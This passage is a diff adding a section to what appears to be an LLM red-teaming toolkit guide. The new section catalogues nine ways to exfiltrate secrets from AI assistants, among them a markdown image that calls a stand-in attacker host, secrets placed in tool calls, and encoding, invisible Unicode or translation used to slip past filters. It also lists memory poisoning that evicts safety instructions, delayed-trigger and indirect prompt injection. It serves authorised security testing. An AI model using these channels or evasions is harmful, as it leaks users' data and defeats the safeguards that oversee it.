@@ -83,3 +83,31 @@ This table is the ONE authoritative ASI mapping for the whole toolkit — `skill
 - For blind exfil, require a correlated out-of-band callback (`bughunter/tools/oob_listener.py`), not just a rendered beacon tag.
 - For insecure-output XSS, confirm execution at the **downstream sink** with the XSS verifier (`tools/verifiers/xss.py` / `bughunter/tools/dom_xss_harness.py`), not in the chat reply.
 - Record the exact payload + response excerpt; the report must be reproducible verbatim.
+
+## 6. 2026 EXFILTRATION CHANNELS (9) + ADVANCED TRICKS
+
+Data exfiltration is only a finding when a value the attacker could not know
+crosses the boundary. Plant a unique canary and observe it leave. Channels to
+test, in rough order of how often they survive filtering:
+
+1. **Markdown image** `![](https://attacker/?d=<secret>)` — the classic.
+2. **Clickable link** with the secret in the query string.
+3. **Tool argument** — secret placed into a tool call (fetch/send/shell) that reaches the attacker.
+4. **Code block / artifact** — rendered artifact contains the secret and is fetched downstream.
+5. **JSON/HTML field** — secret smuggled in a structured field the host renders.
+6. **Encoding** — base64 / hex / URL-encode / ROT / reversed to evade substring filters.
+7. **Invisible Unicode** — zero-width / tag characters carry bits past text filters.
+8. **Cross-lingual / translation** — ask for the secret "in French" to dodge keyword guards.
+9. **Timing/ordering side channel** — response ordering leaks a boolean about stored data.
+
+Advanced 2026 techniques:
+
+- **Memory poisoning** (ASI06): oversize context / recursive summarization to evict
+  safety instructions, then persist the attacker instruction.
+- **Delayed execution**: a benign-looking instruction that activates on a later trigger.
+- **Indirect injection**: the payload lives in a document/URL/tool result, not the user turn.
+- **PleaseFix**: a hidden instruction turns a "please fix this" request into an exploit.
+
+**Never report** a leak without the canary actually appearing in an attacker-reachable
+sink. Use `python3 -m tools.verifiers --stdin` with `vuln_class: llm-exfil`,
+`secret_marker: <canary>` (probe + no-canary control). A rendered beacon tag is not exfil.
